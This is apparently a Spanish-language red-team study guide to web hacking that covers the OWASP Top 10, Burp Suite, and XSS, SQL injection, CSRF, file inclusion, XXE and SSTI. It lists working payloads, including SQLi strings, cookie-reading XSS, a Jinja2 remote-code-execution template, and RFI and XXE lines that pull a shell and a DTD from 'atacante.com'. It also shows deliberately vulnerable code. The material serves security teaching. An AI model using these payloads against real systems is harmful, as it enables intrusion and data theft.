# Red Team - Fase 2: Web Hacking

## OWASP Top 10 (2021)

### A01: Broken Access Control
El usuario puede actuar fuera de sus permisos previstos.

```python
# Ejemplo vulnerable
@app.route('/admin/delete_user/<username>')
def delete_user(username):
    # Sin verificación de rol
    db.delete(username)
    return "Deleted"
```

**Explotación:**
- IDOR (Insecure Direct Object Reference)
- Forced browsing
- Elevación de privilegios

### A02: Cryptographic Failures
Fallo en cifrado de datos sensibles.

```python
# Incorrecto - storing en plaintext
password = request.form['password']
db.save(password)

# Correcto - hashing
import bcrypt
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
db.save(hashed)
```

### A03: Injection
Inyección de código malicioso.

```python
# SQL Injection vulnerable
query = f"SELECT * FROM users WHERE name = '{username}'"

# NoSQL Injection
user = db.users.find_one({"username": username})
```

**Tipos:**
- SQL Injection
- NoSQL Injection
- Command Injection
- LDAP Injection
- XPath Injection
- ORM Injection

### A04: Insecure Design
Diseño sin considerar seguridad.

### A05: Security Misconfiguration
Configuración insegura.

```python
# Debug enabled en producción
app.debug = True

# Error messagesverbose
debug=True
```

### A06: Vulnerable Components
Componentes con vulnerabilidades conocidas.

### A07: Authentication Failures
Fallos en autenticación.

```python
# No rate limiting
def login():
    # Sin límite de intentos
    verify_password(username, password)
```

### A08: Software and Data Integrity Failures
Fallo en integridad de código/datos.

### A09: Security Logging Failures
Insuficiente logging.

### A10: Server-Side Request Forgery (SSRF)
El servidor hace peticiones no solicitadas.

```python
# Vulnerable
url = request.form['url']
response = requests.get(url)
```

---

## Burp Suite

### Instalación

```bash
# Kali
sudo apt install burpsuite

# Standalone
java -jar burpsuite_community.jar
```

### Configuración de Proxy

```bash
# Browser: 127.0.0.1:8080
# Proxy settings: export http_proxy=http://127.0.0.1:8080
```

### Herramientas Principales

| Herramienta | Función |
|------------|--------|
| Proxy | Interceptar tráfico |
| Repeater | Reenviar peticiones |
| Intruder | Fuzzing automatizado |
| Decoder | Codificaciones |
| Sequencer | Análisis de randomness |
| Comparer | Comparar respuestas |

### Interceptación

```
1. Proxy → Intercept → ON
2. Navegar a objetivo
3. Ver Request/Response
4. Forward/Drop
```

### Intruder (Fuzzing)

```
1. Enviar a Intruder
2. Positions → Definir payloads
3. Payloads → Tipos de payload
4. Start attack
```

### Técnicas de Fuzzing

```bash
# User-Agent
User-Agent: '; DROP TABLE users;--

# SQLi básico
' OR '1'='1
' OR 1=1--

# XSS básico
<script>alert(1)</script>

# Path traversal
../../../etc/passwd
```

---

## XSS - Cross-Site Scripting

### Tipos

| Tipo | Descripción | Impacto |
|------|-----------|--------|
| Reflected | URL maliciosa | Robo de session |
| Stored | En BD | Mass compromise |
| DOM | Manipulación DOM | Información leakage |

### Payloads

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video><source onerror="alert(1)">
```

### Bypass WAF

```html
<scr_ipt>alert(1)</scr_ipt>
<ScRiPt>alert(1)</sCrIpT>
```

---

## SQL Injection

### Tipos

| Tipo | Descripción |
|------|------------|
| In-band | Error-based, UNION-based |
| Blind | Sin output directo |
| Out-of-band | Diferente canal |

### Detectar

```sql
' OR '1'='1
' OR 1=1--
" OR "
;
```

### Explotación

```sql
-- UNION based
' UNION SELECT NULL--
' UNION SELECT table_name FROM information_schema.tables--

-- Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--

-- Blind
' AND 1=1--
' AND 1=2--
```

---

## CSRF - Cross-Site Request Forgery

### Vulnerabilidad

```html
<!-- CSRF PoC -->
<form action="https://sitio.com/cambiar-email" method="POST">
  <input type="hidden" name="email" value="atacante@mal.com"/>
</form>
<script>document.forms[0].submit()</script>
```

### defensa

```python
# CSRF Token
from flask_wtf import csrf
csrf.generate_token()

# SameSite cookie
Set-Cookie: session=xxx; SameSite=Strict
```

---

## LFI/RFI - Local/Remote File Inclusion

### LFI

```
http://sitio.com?page=../../../../etc/passwd
```

### RFI (si enabled)

```
http://sitio.com?page=http://atacante.com/shell.txt
```

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=index.php
```

---

## XXE - XML External Entity

### Vulnerable

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Explotación

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://atacante.com/evil.dtd">
%dtd;
```

---

## SSTI - Server-Side Template Injection

### Jinja2 (Python)

```python
# Detectar
{{7*7}}

# RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Ruby

```erb
<%= 7*7 %>
<%= system("id") %>
```

---

## APIs REST/GraphQL

### Enumeración

```bash
# Métodos disponibles
OPTIONS /api/users

# HEADERS
curl -X GET /api/users -H "Content-Type: application/json"
```

### GraphQL Introspection

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

### Mutation

```graphql
mutation {
  login(username: "admin", password: "admin") {
    token
  }
}
```

---

## Resumen

| Vulnerabilidad | Severidad | Frecuencia |
|---------------|-----------|-----------|
| SQLi | Critical | Alta |
| XSS | Medium-High | Muy Alta |
| IDOR | Medium | Alta |
| CSRF | Medium | Media |
| XXE | High | Media |
| SSRF | High | Media |

---

## Recursos

- PortSwigger Web Security Academy
- OWASP Top 10
- PayloadsAllTheThings